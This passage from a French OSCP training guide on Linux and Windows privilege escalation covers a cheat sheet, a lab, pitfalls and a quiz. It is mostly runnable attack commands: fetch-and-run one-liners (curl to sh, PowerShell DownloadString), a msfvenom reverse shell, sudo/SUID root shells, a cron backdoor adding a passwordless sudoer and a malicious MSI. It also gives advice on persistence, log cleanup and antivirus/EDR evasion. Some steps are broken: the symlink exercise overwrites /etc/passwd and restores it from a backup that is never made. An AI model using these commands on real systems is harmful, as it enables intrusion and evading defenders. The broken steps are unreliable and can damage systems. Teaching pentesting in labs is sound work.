| **Linux** | `sudo -l` | Affiche les commandes exécutables avec sudo | Identifie immédiatement les binaires exploitables sans mot de passe |
| **Linux** | `find / -perm -u=s -type f 2>/dev/null` | Recherche les binaires SUID | Trouve rapidement les binaires avec privilèges élevés |
| **Linux** | `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh \| sh` | Exécute LinPEAS | Analyse automatisée complète du système |
| **Linux** | `getcap -r / 2>/dev/null` | Recherche les binaires avec capabilities | Identifie les binaires avec privilèges spécifiques |
| **Linux** | `cat /etc/crontab` | Affiche les tâches cron système | Révèle les scripts exécutés périodiquement avec privilèges |
| **Windows** | `whoami /priv` | Affiche les privilèges de l'utilisateur actuel | Identifie les privilèges exploitables (SeImpersonate, etc.) |
| **Windows** | `powershell -ep bypass -c "iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1');Invoke-AllChecks"` | Exécute PowerUp | Analyse rapide des vecteurs d'escalade courants |
| **Windows** | `.\winPEAS.exe` | Exécute WinPEAS | Analyse automatisée complète du système |
| **Windows** | `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated` | Vérifie AlwaysInstallElevated | Identifie si les packages MSI peuvent être installés avec privilèges |
| **Windows** | `.\PrintSpoofer.exe -i -c cmd` | Exploite le service Spooler | Obtient un shell SYSTEM si SeImpersonatePrivilege est disponible |

### 5.2 Checklist "Privesc Express"

#### Phase 1: Énumération initiale (5-10 minutes)
- [ ] Identifier le système d'exploitation et sa version exacte
- [ ] Vérifier les privilèges actuels et les groupes
- [ ] Examiner les configurations sudo (Linux) ou les privilèges utilisateur (Windows)
- [ ] Rechercher les fichiers avec permissions spéciales (SUID/SGID pour Linux)
- [ ] Vérifier les processus en cours d'exécution et leurs propriétaires

#### Phase 2: Exploitation ciblée (10-15 minutes)
- [ ] Tester les vecteurs à faible risque identifiés (sudo, SUID, etc.)
- [ ] Exécuter un outil d'énumération automatisé (LinPEAS/WinPEAS)
- [ ] Analyser les résultats et identifier les 2-3 vecteurs les plus prometteurs
- [ ] Tenter l'exploitation du vecteur le plus prometteur

#### Phase 3: Exploitation avancée (15-30 minutes)
- [ ] Exécuter un suggester d'exploits basé sur la version du système
- [ ] Tester les exploits suggérés par ordre de fiabilité
- [ ] En cas d'échec, revenir aux vecteurs alternatifs identifiés
- [ ] Tenter des techniques de contournement si des protections sont détectées

#### Phase 4: Persistance minimale (5 minutes)
- [ ] Créer un accès persistant (utilisateur privilégié, tâche planifiée)
- [ ] Nettoyer les traces évidentes (fichiers temporaires, historique)
- [ ] Documenter les vecteurs exploités pour le rapport

### 5.3 Scénario express : De l'accès initial aux privilèges élevés

Ce scénario combine une escalade de privilèges Linux (via SUID) suivie d'une escalade Windows (via service vulnérable) dans un environnement hybride.

#### Partie 1: Escalade Linux via binaire SUID

1. Vous avez obtenu un accès SSH à un serveur Linux en tant qu'utilisateur standard.

2. Énumération rapide des binaires SUID :
   ```bash
   find / -perm -u=s -type f 2>/dev/null
   ```

3. Vous découvrez que `python` a le bit SUID :
   ```bash
   ls -la /usr/bin/python
   # -rwsr-xr-x 1 root root 3665768 Aug 13 2021 /usr/bin/python
   ```

4. Exploitation du binaire SUID pour obtenir un shell root :
   ```bash
   /usr/bin/python -c 'import os; os.setuid(0); os.system("/bin/bash")'
   ```

5. Vérification des privilèges :
   ```bash
   whoami
   # root
   ```

6. Vous avez maintenant un accès root au serveur Linux.

#### Partie 2: Escalade Windows via service vulnérable

1. Depuis le serveur Linux compromis, vous découvrez des identifiants pour un serveur Windows dans le réseau interne.

2. Vous vous connectez au serveur Windows via RDP ou WinRM en tant qu'utilisateur standard.

3. Énumération rapide des services :
   ```powershell
   wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
   ```

4. Vous identifiez un service avec un chemin non cité :
   ```
   VulnService  C:\Program Files\Vulnerable Service\service.exe
   ```

5. Vérification des permissions sur le répertoire :
   ```powershell
   icacls "C:\Program Files\Vulnerable Service"
   # BUILTIN\Users:(M)
   ```

6. Création d'un exécutable malveillant :
   ```powershell
   # Sur la machine attaquante, créer un payload
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o Program.exe
   
   # Transférer le fichier sur la cible
   # Placer le fichier à C:\Program.exe
   ```

7. Redémarrage du service vulnérable :
   ```powershell
   sc stop VulnService
   sc start VulnService
   ```

8. Vous recevez un shell SYSTEM sur votre listener.

9. Vérification des privilèges :
   ```powershell
   whoami
   # NT AUTHORITY\SYSTEM
   ```

Ce scénario démontre comment, en moins d'une heure, vous pouvez passer d'un accès initial à des privilèges élevés sur deux systèmes différents en exploitant des configurations incorrectes courantes.

## 6. Mini-lab guidé (90 minutes)

Ce mini-lab vous permettra de mettre en pratique les techniques d'escalade de privilèges sur des environnements Ubuntu 22.04 et Windows 10. Les exercices sont conçus pour être réalisables en 90 minutes et couvrent plusieurs vecteurs d'attaque courants.

### 6.1 Préparation de l'environnement

#### Configuration requise
- Machine virtuelle Ubuntu 22.04 LTS
- Machine virtuelle Windows 10
- Kali Linux ou machine d'attaque équivalente

#### Configuration des machines virtuelles

**Pour Ubuntu 22.04 :**
1. Créez un utilisateur standard nommé `student` avec le mot de passe `oscp123`
2. Configurez les vulnérabilités suivantes en tant que root :
   ```bash
   # Créer un binaire SUID vulnérable
   echo '#!/bin/bash' > /usr/local/bin/backup.sh
   echo 'tar -czvf /tmp/backup.tar.gz /etc/passwd' >> /usr/local/bin/backup.sh
   chmod +x /usr/local/bin/backup.sh
   chmod u+s /usr/local/bin/backup.sh
   
   # Configurer une tâche cron vulnérable
   echo "* * * * * root /usr/local/bin/status.sh" >> /etc/crontab
   echo '#!/bin/bash' > /usr/local/bin/status.sh
   echo 'ps aux > /tmp/status.txt' >> /usr/local/bin/status.sh
   chmod +x /usr/local/bin/status.sh
   chmod 777 /usr/local/bin/status.sh
   
   # Configurer une entrée sudoers vulnérable
   echo "student ALL=(root) NOPASSWD: /usr/bin/find" >> /etc/sudoers.d/student
   ```

**Pour Windows 10 :**
1. Créez un utilisateur standard nommé `student` avec le mot de passe `oscp123`
2. Ajoutez l'utilisateur au groupe `Utilisateurs avec pouvoir`
3. Configurez les vulnérabilités suivantes en tant qu'administrateur :
   ```powershell
   # Créer un service vulnérable avec chemin non cité
   sc create VulnService binpath= "C:\Program Files\Vulnerable Service\service.exe" start= auto
   mkdir "C:\Program Files\Vulnerable Service"
   echo @echo off > "C:\Program Files\Vulnerable Service\service.exe"
   echo exit > "C:\Program Files\Vulnerable Service\service.exe"
   icacls "C:\Program Files\Vulnerable Service" /grant "Utilisateurs avec pouvoir":(M)
   
   # Configurer AlwaysInstallElevated
   reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
   reg add HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
   ```

### 6.2 Lab Ubuntu 22.04 (45 minutes)

#### Exercice 1: Énumération initiale (10 minutes)

1. Connectez-vous à la machine Ubuntu en tant qu'utilisateur `student`
   ```bash
   ssh student@<IP_UBUNTU>
   # Mot de passe: oscp123
   ```

2. Effectuez une énumération de base du système :
   ```bash
   # Informations système
   uname -a
   cat /etc/issue
   
   # Informations utilisateur
   id
   sudo -l
   
   # Recherche de binaires SUID
   find / -perm -u=s -type f 2>/dev/null
   ```

3. Analysez les résultats et identifiez les vecteurs potentiels :
   - Permissions sudo pour `/usr/bin/find`
   - Binaire SUID `/usr/local/bin/backup.sh`

#### Exercice 2: Exploitation via sudo (10 minutes)

1. Exploitez les permissions sudo pour `/usr/bin/find` :
   ```bash
   # Exécuter find avec sudo pour obtenir un shell root
   sudo find /etc -exec /bin/sh \; -quit
   ```

2. Vérifiez que vous avez obtenu un shell root :
   ```bash
   whoami
   # Résultat attendu: root
   ```

3. Examinez le système en tant que root :
   ```bash
   # Vérifier les tâches cron
   cat /etc/crontab
   
   # Examiner le script exécuté par cron
   ls -la /usr/local/bin/status.sh
   cat /usr/local/bin/status.sh
   ```

4. Quittez le shell root :
   ```bash
   exit
   ```

#### Exercice 3: Exploitation via script cron (15 minutes)

1. Modifiez le script vulnérable exécuté par cron :
   ```bash
   # Sauvegardez le contenu original
   cp /usr/local/bin/status.sh /tmp/status.sh.bak
   
   # Remplacez le contenu par une commande pour créer un utilisateur privilégié
   echo '#!/bin/bash' > /usr/local/bin/status.sh
   echo 'useradd -m -p $(openssl passwd -1 hacker123) -s /bin/bash -G sudo hacker' >> /usr/local/bin/status.sh
   echo 'echo "hacker ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers' >> /usr/local/bin/status.sh
   ```

2. Attendez que la tâche cron s'exécute (maximum 1 minute)

3. Vérifiez que l'utilisateur a été créé :
   ```bash
   grep hacker /etc/passwd
   ```

4. Connectez-vous en tant que nouvel utilisateur :
   ```bash
   su - hacker
   # Mot de passe: hacker123
   ```

5. Vérifiez les privilèges sudo :
   ```bash
   sudo -l
   ```

6. Restaurez le script original pour nettoyer :
   ```bash
   sudo cp /tmp/status.sh.bak /usr/local/bin/status.sh
   ```

#### Exercice 4: Exploitation via binaire SUID (10 minutes)

1. Examinez le binaire SUID découvert précédemment :
   ```bash
   ls -la /usr/local/bin/backup.sh
   cat /usr/local/bin/backup.sh
   ```

2. Exploitez le script SUID pour lire des fichiers sensibles :
   ```bash
   # Créez un lien symbolique vers un fichier sensible
   ln -sf /etc/shadow /etc/passwd
   
   # Exécutez le script SUID
   /usr/local/bin/backup.sh
   
   # Examinez l'archive créée
   tar -tvf /tmp/backup.tar.gz
   tar -xf /tmp/backup.tar.gz -C /tmp
   cat /tmp/etc/passwd
   ```

3. Restaurez le fichier passwd :
   ```bash
   # Supprimez le lien symbolique
   sudo rm /etc/passwd
   sudo cp /etc/passwd.bak /etc/passwd
   ```

### 6.3 Lab Windows 10 (45 minutes)

#### Exercice 1: Énumération initiale (10 minutes)

1. Connectez-vous à la machine Windows en tant qu'utilisateur `student`

2. Ouvrez PowerShell et effectuez une énumération de base :
   ```powershell
   # Informations système
   systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
   
   # Informations utilisateur
   whoami /all
   
   # Vérifier les services
   wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
   
   # Vérifier AlwaysInstallElevated
   reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
   reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
   ```

3. Analysez les résultats et identifiez les vecteurs potentiels :
   - Service vulnérable avec chemin non cité
   - Politique AlwaysInstallElevated activée

#### Exercice 2: Exploitation via chemin de service non cité (20 minutes)

1. Vérifiez les permissions sur le répertoire du service :
   ```powershell
   icacls "C:\Program Files\Vulnerable Service"
   ```

2. Créez un exécutable malveillant :
   ```powershell
   # Créez un script batch simple pour démontrer l'exploitation
   @echo off > C:\Program.exe
   echo net user admin P@ssw0rd /add >> C:\Program.exe
   echo net localgroup Administrators admin /add >> C:\Program.exe
   ```

3. Redémarrez le service vulnérable :
   ```powershell
   sc stop VulnService
   sc start VulnService
   ```

4. Vérifiez que l'utilisateur a été créé :
   ```powershell
   net user admin
   ```

5. Connectez-vous en tant que nouvel utilisateur administrateur :
   ```powershell
   # Ouvrez une nouvelle session ou utilisez runas
   runas /user:admin cmd.exe
   # Mot de passe: P@ssw0rd
   ```

6. Nettoyez en supprimant l'utilisateur créé :
   ```powershell
   net user admin /delete
   ```

#### Exercice 3: Exploitation via AlwaysInstallElevated (15 minutes)

1. Créez un package MSI malveillant (sur votre machine Kali) :
   ```bash
   # Sur Kali Linux
   msfvenom -p windows/exec CMD='net user msiuser P@ssw0rd123 /add && net localgroup Administrators msiuser /add' -f msi -o evil.msi
   ```

2. Transférez le fichier MSI sur la machine Windows (via SMB, HTTP ou autre méthode)

3. Installez le package MSI avec privilèges élevés :
   ```powershell
   msiexec /quiet /qn /i C:\path\to\evil.msi
   ```

4. Vérifiez que l'utilisateur a été créé :
   ```powershell
   net user msiuser
   ```

5. Connectez-vous en tant que nouvel utilisateur administrateur :
   ```powershell
   runas /user:msiuser cmd.exe
   # Mot de passe: P@ssw0rd123
   ```

6. Nettoyez en supprimant l'utilisateur créé :
   ```powershell
   net user msiuser /delete
   ```

### 6.4 Considérations OPSEC et bonnes pratiques

Pendant les exercices, observez les traces laissées par vos actions :

**Sur Linux :**
- Examinez les journaux d'authentification : `sudo cat /var/log/auth.log`
- Vérifiez l'historique des commandes : `history`
- Observez les processus en cours : `ps aux`

**Sur Windows :**
- Examinez le journal de sécurité : `eventvwr.msc` → Journaux Windows → Sécurité
- Vérifiez les processus en cours : `tasklist`
- Observez les connexions réseau : `netstat -ano`

**Bonnes pratiques :**
- Limitez l'utilisation de commandes bruyantes
- Nettoyez les fichiers temporaires et les artefacts
- Restaurez les configurations modifiées
- Documentez vos actions pour le rapport

Ce mini-lab vous a permis de mettre en pratique plusieurs techniques d'escalade de privilèges courantes dans des environnements contrôlés. Ces compétences sont directement applicables aux scénarios d'examen OSCP.

## 7. Pièges classiques

L'escalade de privilèges est parsemée d'embûches qui peuvent compromettre vos efforts ou, pire, alerter les défenseurs de votre présence. Cette section détaille les erreurs les plus courantes et comment les éviter.

### 7.1 Pièges généraux

#### Sous-estimation de l'énumération

**Piège** : Se précipiter vers l'exploitation sans énumération complète.

**Exemple** : Un pentesteur découvre un binaire SUID et tente immédiatement de l'exploiter, sans remarquer que le système dispose d'une configuration sudo vulnérable beaucoup plus simple à exploiter.

**Solution** : Toujours effectuer une énumération exhaustive avant de choisir un vecteur d'attaque. Documentez tous les vecteurs potentiels et évaluez-les en fonction de leur fiabilité et discrétion.

#### Outils d'énumération bruyants

**Piège** : Utiliser des scripts d'énumération automatisés sans considérer leur impact.

**Exemple** : Exécuter LinPEAS sur un système de production déclenche des alertes de sécurité en raison des nombreux accès fichiers et commandes exécutées.

**Solution** : 
- Utilisez des options plus discrètes (`-q` pour LinPEAS)
- Exécutez les outils par sections plutôt qu'en totalité
- Préférez l'énumération manuelle ciblée dans les environnements sensibles
- Vérifiez la présence de solutions EDR avant d'exécuter des scripts automatisés

#### Négligence des journaux

**Piège** : Ignorer les traces laissées dans les journaux système.

**Exemple** : Multiples tentatives d'exploitation échouées générant des entrées dans `/var/log/auth.log` ou l'Observateur d'événements Windows.

**Solution** :
- Surveillez les journaux pertinents pendant vos tentatives
- Limitez le nombre de tentatives infructueuses
- Utilisez des techniques qui génèrent moins de logs (ex: exploitation en mémoire)

#### Exploits de noyau risqués

**Piège** : Utiliser des exploits de noyau sans évaluer les risques.

**Exemple** : L'exécution de DirtyCow sur un serveur de production provoque un crash système et une indisponibilité.

**Solution** :
- Utilisez les exploits de noyau en dernier recours
- Vérifiez la compatibilité exacte avec la version cible
- Prévenez le client des risques potentiels
- Testez d'abord dans un environnement similaire si possible

### 7.2 Pièges spécifiques à Linux

#### Mauvaise interprétation des permissions SUID

**Piège** : Supposer qu'un binaire SUID est automatiquement exploitable.

**Exemple** : Tenter d'exploiter `/usr/bin/passwd` avec le bit SUID, alors que ce binaire est conçu pour résister aux abus.

**Solution** : Vérifiez si le binaire est réellement vulnérable en consultant GTFOBins ou en analysant son comportement.

#### Confusion avec les capabilities

**Piège** : Ne pas comprendre la différence entre les capabilities et les permissions traditionnelles.

**Exemple** : Un binaire sans bit SUID mais avec `cap_setuid+ep` est ignoré lors de l'énumération.

**Solution** : Utilisez toujours `getcap -r / 2>/dev/null` en complément de la recherche de binaires SUID.

#### Modification permanente des fichiers système

**Piège** : Modifier des fichiers système sans sauvegarde.

**Exemple** : Remplacer un binaire système par une backdoor sans conserver l'original.

**Solution** :
- Créez toujours des sauvegardes avant modification
- Utilisez des techniques non persistantes quand c'est possible
- Documentez toutes les modifications pour le nettoyage

#### Dépendance excessive aux scripts d'énumération

**Piège** : Se fier uniquement aux résultats des scripts automatisés.

**Exemple** : LinPEAS ne détecte pas une vulnérabilité spécifique à l'environnement, comme un script personnalisé avec des permissions incorrectes.

**Solution** : Complétez toujours l'énumération automatique par une analyse manuelle ciblée.

### 7.3 Pièges spécifiques à Windows

#### Sous-estimation de l'UAC

**Piège** : Ignorer les restrictions imposées par l'UAC.

**Exemple** : Obtenir un shell avec un utilisateur du groupe Administrateurs mais sans pouvoir exécuter des commandes privilégiées à cause de l'UAC.

**Solution** : Identifiez le niveau d'UAC et utilisez des techniques de contournement appropriées.

#### Confusion entre privilèges et groupes

**Piège** : Confondre l'appartenance à un groupe privilégié et la possession de privilèges spécifiques.

**Exemple** : Tenter d'utiliser PrintSpoofer sans vérifier la présence du privilège SeImpersonatePrivilege.

**Solution** : Vérifiez toujours les privilèges effectifs avec `whoami /priv` avant de tenter une exploitation.

#### Détection par les solutions antivirus

**Piège** : Ignorer la présence de solutions antivirus.

**Exemple** : Télécharger Mimikatz sur un système Windows Defender actif, entraînant sa détection et suppression immédiate.

**Solution** :
- Vérifiez les solutions de sécurité en place (`wmic /namespace:\\root\SecurityCenter2 path AntiVirusProduct get displayName`)
- Utilisez des techniques d'obfuscation ou d'évasion
- Préférez les outils natifs de Windows quand c'est possible (LOLBins)

#### Négligence des permissions de service

**Piège** : Supposer qu'un service vulnérable peut être exploité sans vérifier les permissions.

**Exemple** : Identifier un service avec un chemin non cité mais ne pas pouvoir écrire dans le répertoire concerné.

**Solution** : Vérifiez toujours les permissions avec `icacls` avant de tenter d'exploiter un service.

### 7.4 Pièges liés à l'OPSEC

#### Connexions réseau non sécurisées

**Piège** : Établir des connexions non chiffrées pour les transferts de fichiers ou shells.

**Exemple** : Utiliser un reverse shell Netcat non chiffré détecté par l'IDS du réseau.

**Solution** :
- Utilisez des connexions chiffrées (SSH, HTTPS)
- Tunnelisez le trafic quand c'est possible
- Limitez le nombre de connexions

#### Téléchargement direct d'outils malveillants

**Piège** : Télécharger des outils connus comme malveillants directement sur la cible.

**Exemple** : Télécharger Mimikatz via PowerShell, déclenchant des alertes EDR.

**Solution** :
- Utilisez des techniques de chargement en mémoire
- Obfusquez les outils connus
- Préférez développer des outils personnalisés pour les engagements sensibles

#### Nettoyage incomplet

**Piège** : Laisser des traces après l'exploitation.

**Exemple** : Oublier de supprimer des scripts d'exploitation ou des utilisateurs créés.

**Solution** :
- Documentez toutes vos actions pendant l'exploitation
- Créez une checklist de nettoyage
- Vérifiez systématiquement les artefacts laissés

### 7.5 Erreurs de jugement

#### Exploitation excessive

**Piège** : Exploiter plus de vulnérabilités que nécessaire.

**Exemple** : Après avoir obtenu des privilèges root/SYSTEM, continuer à exploiter d'autres vulnérabilités, augmentant les risques de détection.

**Solution** : Une fois l'objectif atteint, documentez les autres vulnérabilités sans les exploiter inutilement.

#### Négligence des impacts

**Piège** : Ne pas considérer l'impact des exploits sur la stabilité du système.

**Exemple** : Utiliser un exploit qui corrompt une base de données de production.

**Solution** :
- Évaluez toujours les risques avant exploitation
- Communiquez clairement avec le client sur les risques potentiels
- Préférez les techniques à faible impact quand c'est possible

En évitant ces pièges classiques, vous augmenterez significativement vos chances de réussite lors des tentatives d'escalade de privilèges, tout en minimisant les risques de détection et d'impact sur les systèmes cibles.

## 8. Points clés

Cette section synthétise les concepts fondamentaux et les principes directeurs pour maîtriser l'escalade de privilèges dans les environnements Linux et Windows.

### 8.1 Principes méthodologiques

#### La méthodologie prime sur les outils
L'escalade de privilèges réussie repose davantage sur une méthodologie rigoureuse que sur des outils spécifiques. Une approche systématique d'énumération, d'analyse et d'exploitation est essentielle. Les outils automatisés sont des accélérateurs, mais ne remplacent pas la compréhension des mécanismes sous-jacents.

#### L'énumération est itérative
L'énumération n'est pas une phase unique mais un processus itératif. Après chaque élévation partielle de privilèges, recommencez l'énumération avec vos nouveaux droits pour découvrir des vecteurs supplémentaires. Cette approche cyclique est particulièrement efficace dans les environnements complexes.

#### La patience est stratégique
La précipitation est l'ennemie de l'escalade de privilèges réussie. Prenez le temps d'analyser complètement votre environnement avant d'agir. Une exploitation ratée peut alerter les défenseurs et fermer définitivement une opportunité.

### 8.2 Concepts techniques essentiels

#### Comprendre les modèles de sécurité
La maîtrise des modèles de sécurité sous-jacents (DAC sous Linux, RBAC et UAC sous Windows) est fondamentale. Ces connaissances vous permettent d'identifier les incohérences et les faiblesses dans leur implémentation.

#### Privilèges vs. permissions
Distinguez clairement les privilèges (capacités spéciales accordées à un processus) des permissions (contrôles d'accès sur les ressources). Cette distinction est cruciale, particulièrement sous Windows où des privilèges comme SeImpersonatePrivilege peuvent être exploités indépendamment des permissions sur les fichiers.

#### Contexte d'exécution
Soyez toujours conscient du contexte dans lequel s'exécutent vos commandes et exploits. Sous Linux, les variables d'environnement, le PATH et les capabilities peuvent modifier le comportement des binaires. Sous Windows, les jetons d'accès, l'intégrité des processus et les restrictions AppLocker influencent vos possibilités d'exploitation.

### 8.3 Stratégies d'exploitation

#### Privilégier les vecteurs à faible risque
Hiérarchisez vos tentatives d'exploitation en commençant par les vecteurs les plus fiables et les moins risqués :
1. Configurations incorrectes (sudo, permissions)
2. Mauvaises pratiques (fichiers modifiables)
3. Vulnérabilités logicielles connues
4. Exploits de noyau (en dernier recours)

#### Combiner les techniques
Les scénarios d'escalade de privilèges complexes nécessitent souvent la combinaison de plusieurs techniques. Par exemple, une permission de fichier faible peut vous permettre d'injecter du code dans un script exécuté par une tâche cron, qui à son tour vous donne accès à un service privilégié.

#### Adapter l'approche au contexte
L'environnement dicte la stratégie. Dans un contexte de test d'intrusion standard, privilégiez la fiabilité. Dans un contexte de Red Team, la discrétion devient prioritaire. Pour l'OSCP, la démonstration claire de la compromission est l'objectif principal.

### 8.4 Considérations défensives

#### Penser comme un défenseur
Comprendre les mécanismes de détection vous aide à les éviter. Familiarisez-vous avec les journaux système, les solutions EDR et les indicateurs de compromission typiques pour adapter vos techniques.

#### Minimiser l'empreinte
Limitez votre impact sur le système cible. Évitez les modifications permanentes, les créations de fichiers inutiles et les connexions réseau excessives. L'escalade de privilèges idéale est celle qui reste indétectable.

#### Documenter pour remédier
En tant que professionnel de la sécurité, votre objectif final est d'améliorer la posture de sécurité. Documentez précisément les vulnérabilités exploitées et proposez des mesures de remédiation concrètes.

### 8.5 Préparation à l'OSCP

#### Maîtriser les fondamentaux
L'OSCP teste votre compréhension des mécanismes fondamentaux plutôt que votre capacité à utiliser des exploits avancés. Concentrez-vous sur la maîtrise des techniques de base et leur application dans divers contextes.

#### Pratiquer la résolution de problèmes
L'OSCP présente souvent des obstacles inattendus. Développez votre capacité à adapter vos techniques et à contourner les difficultés. La persévérance et la créativité sont aussi importantes que les connaissances techniques.

#### Documenter méthodiquement
Pendant l'examen, documentez chaque étape de votre processus d'escalade de privilèges. Cette documentation est essentielle pour le rapport et vous aide à maintenir une approche structurée sous pression.

En intégrant ces points clés à votre pratique, vous développerez une approche robuste et adaptable de l'escalade de privilèges, applicable tant dans les scénarios d'examen que dans les engagements professionnels réels.

## 9. Mini-quiz QCM

Testez vos connaissances sur l'escalade de privilèges avec ce mini-quiz. Chaque question comporte une seule réponse correcte.

### Question 1 : Exploitation Linux

Lors d'une énumération sur un système Linux, vous découvrez que l'utilisateur peut exécuter `/usr/bin/find` avec sudo sans mot de passe. Quelle commande vous permettrait d'obtenir un shell root ?

A) `sudo find / -name root -exec whoami \;`
B) `sudo find / -name root -exec /bin/sh \;`
C) `sudo find / -exec /bin/sh \; -quit`
D) `sudo find / -perm -4000 -exec /bin/bash \;`

**Réponse correcte : C**

**Explication :** La commande `sudo find / -exec /bin/sh \; -quit` exploite les capacités d'exécution de commandes de `find` pour lancer un shell avec les privilèges de l'utilisateur qui exécute `find` (root via sudo). L'option `-quit` est importante car elle arrête `find` après la première exécution, évitant ainsi des erreurs potentielles. L'option A exécute simplement `whoami` sans obtenir de shell. L'option B est presque correcte mais pourrait générer des erreurs car elle continue à chercher après avoir lancé le shell. L'option D recherche des fichiers SUID mais n'exploite pas directement les privilèges sudo.

### Question 2 : Exploitation Windows

Sur un système Windows, vous avez obtenu un shell avec un utilisateur standard et découvert qu'il possède le privilège `SeImpersonatePrivilege`. Quelle technique d'exploitation est la plus appropriée ?

A) Exploitation d'AlwaysInstallElevated
B) Utilisation de PrintSpoofer ou RoguePotato
C) Contournement d'UAC via fodhelper.exe
D) Exploitation d'un chemin de service non cité

**Réponse correcte : B**

**Explication :** Le privilège `SeImpersonatePrivilege` permet à un processus d'emprunter l'identité d'un client après authentification. PrintSpoofer et RoguePotato exploitent spécifiquement ce privilège pour obtenir un shell SYSTEM en forçant le service Spooler (qui s'exécute en tant que SYSTEM) à créer un processus que vous pouvez usurper. L'option A (AlwaysInstallElevated) nécessite une configuration spécifique du registre et non un privilège particulier. L'option C (contournement d'UAC) est utile pour les utilisateurs du groupe Administrateurs mais ne dépend pas de `SeImpersonatePrivilege`. L'option D (chemin de service non cité) exploite une mauvaise configuration de service et non un privilège utilisateur.

### Question 3 : OPSEC et détection

Lors d'une tentative d'escalade de privilèges, quelle action est la plus susceptible de déclencher des alertes dans un environnement équipé d'un EDR moderne ?

A) Exécution de `sudo -l` pour vérifier les permissions sudo
B) Utilisation de `find / -perm -u=s -type f 2>/dev/null` pour rechercher des binaires SUID
C) Téléchargement et exécution de Mimikatz
D) Modification d'un script exécuté par une tâche cron

**Réponse correcte : C**

**Explication :** Mimikatz est un outil bien connu pour l'extraction de mots de passe et la manipulation de jetons, détecté par pratiquement tous les EDR modernes. Son téléchargement et son exécution déclencheront presque certainement des alertes. L'option A (`sudo -l`) est une commande légitime utilisée régulièrement par les administrateurs système. L'option B (recherche de binaires SUID) est une commande de recherche standard qui, bien que potentiellement suspecte, n'est pas aussi flagrante que Mimikatz. L'option D (modification d'un script cron) peut être détectée par des solutions de surveillance d'intégrité de fichiers, mais est généralement moins surveillée que l'exécution d'outils malveillants connus.
